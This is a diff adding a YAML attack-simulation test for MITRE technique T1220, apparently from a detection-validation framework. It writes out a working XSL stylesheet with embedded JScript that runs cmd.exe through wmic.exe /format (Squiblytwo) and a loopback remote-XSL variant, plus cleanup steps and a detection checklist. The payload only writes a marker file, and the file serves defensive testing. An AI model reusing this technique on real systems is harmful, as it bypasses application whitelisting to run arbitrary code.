@@ -1,0 +1,109 @@
+id: T1220_xsl_script_processing
+name: "XSL Script Processing"
+mitre_technique: "T1220"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries use XSL (Extensible Stylesheet Language) files with embedded scripts
+  to proxy execution. The primary method is wmic.exe with /format:<url_or_path> —
+  WMIC loads the XSL, which executes embedded JScript or VBScript. This bypasses
+  application whitelisting because execution is via wmic.exe (a signed Windows binary).
+  msxsl.exe (Microsoft XSLT command line) provides a second path. Both methods can
+  load XSL from remote URLs, enabling fileless remote execution.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1220/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1220 — XSL Script Processing simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a malicious XSL file with embedded JScript payload"
+    command: |
+      $xslPath = "$env:TEMP\PAS_T1220_payload.xsl"
+      $outFile = "$env:TEMP\PAS_T1220_fired.txt"
+      Set-Content $xslPath @"
+<?xml version='1.0'?>
+<stylesheet version="1.0"
+            xmlns="http://www.w3.org/1999/XSL/Transform"
+            xmlns:ms="urn:schemas-microsoft-com:xslt"
+            xmlns:user="placeholder">
+<output method="text"/>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell");
+r.Run("cmd.exe /c echo PAS-T1220-WMIC-XSL > $outFile", 0, true);
+]]>
+</ms:script>
+<template match="/">
+  <value-of select="user:exec()"/>
+</template>
+</stylesheet>
+"@
+      Write-Host "[PAS] XSL payload written: $xslPath"
+
+  - step: 3
+    type: exec_powershell
+    description: "Execute via wmic.exe /format — WMIC XSL execution (Squiblytwo)"
+    command: |
+      $xslPath = "$env:TEMP\PAS_T1220_payload.xsl"
+      Write-Host "[PAS] Executing Squiblytwo: wmic.exe os get /format:$xslPath"
+      Start-Process wmic.exe -ArgumentList "os get /format:`"$xslPath`"" `
+          -Wait -NoNewWindow -ErrorAction SilentlyContinue
+      if (Test-Path "$env:TEMP\PAS_T1220_fired.txt") {
+          Write-Host "[PAS] XSL EXECUTED via wmic.exe — cmd.exe ran via WMIC proxy"
+      } else {
+          Write-Host "[PAS] XSL execution blocked or WMIC not available (expected on hardened systems)"
+      }
+
+  - step: 4
+    type: exec_powershell
+    description: "Pattern 2: wmic with remote XSL URL (loopback — no external traffic)"
+    command: |
+      Write-Host "[PAS] Remote XSL URL pattern (loopback — no external traffic):"
+      Write-Host "[PAS] wmic.exe os get /format:http://127.0.0.1/PAS_T1220.xsl"
+      Start-Process wmic.exe `
+          -ArgumentList "os get /format:`"http://127.0.0.1/PAS_T1220_payload.xsl`"" `
+          -Wait -NoNewWindow -ErrorAction SilentlyContinue
+      Write-Host "[PAS] Remote XSL network attempt telemetry generated"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — wmic.exe with /format argument pointing to .xsl file or URL"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove XSL and output files"
+    command: |
+      @("$env:TEMP\PAS_T1220_payload.xsl",
+        "$env:TEMP\PAS_T1220_fired.txt") |
+          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+      Write-Host "[PAS][Cleanup] XSL files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1220 cleanup complete"
+
+analyst_checklist:
+  - "Process event: wmic.exe with /format: argument pointing to non-system path or URL"
+  - "Network event: wmic.exe making HTTP connection to load remote XSL"
+  - "Process event: wmic.exe spawning cmd.exe or wscript.exe as child"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'wmic.exe' and ProcessCommandLine contains '/format'"
+  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName == 'wmic.exe'"
+  - "MDE alert: 'WMIC XSL script execution' or 'Squiblytwo technique detected'"
+  - "CONTROL CHECK: wmic.exe /format with any non-standard path or URL should always alert"
+  - "CONTROL CHECK: wmic.exe network connections are almost never legitimate — block or alert on any wmic outbound"
+  - "CONTROL CHECK: ASR rule 'Block process creations originating from PSExec and WMI commands' covers WMIC child spawning"
